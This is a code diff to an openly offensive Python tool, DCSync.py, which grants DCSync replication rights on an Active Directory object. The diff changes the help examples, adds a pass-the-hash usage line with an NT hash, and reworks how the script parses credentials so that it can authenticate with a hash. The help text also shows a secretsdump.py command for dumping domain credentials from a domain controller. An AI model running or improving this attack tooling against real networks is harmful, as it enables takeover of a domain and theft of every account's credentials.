@@ -27,9 +27,10 @@ parser.add_argument('-k', action='store_true', help='If you want to use a Kerber
 
 str_help = r"""
  Examples:
-     DCSync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator:Password123
-     DCSync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator -k
-     DCSync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL:P@$$w0rd123'
+     dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator:Password123
+     dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator -k
+     dcsync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL:P@$$w0rd123'
+     dcsync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL' -hashes :32693b11e6aa90eb43d32c72a07ceea6
 
  DCSync Attack:
      secretsdump.py 'n00py.local/spoNge369:passw0rd123!@dc01.n00py.local'
@@ -54,13 +55,14 @@ if options.hashes:
     # support only :NTHASH format (no LM)
     attackerpassword = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[1]).upper()
 
+else:
+   attackeraccount = options.identity.split(':')
+   attackerpassword = attackeraccount[1]
+
+
 if options.k: 
     attackeraccount = options.identity.split(':')
     
-else:
-    attackeraccount = options.identity.split(':')
-    attackerpassword = attackeraccount[1]
-
 logger.init()
 logging.getLogger().setLevel(logging.INFO)
 logging.info('Starting DCSync Attack against {}'.format(options.t))
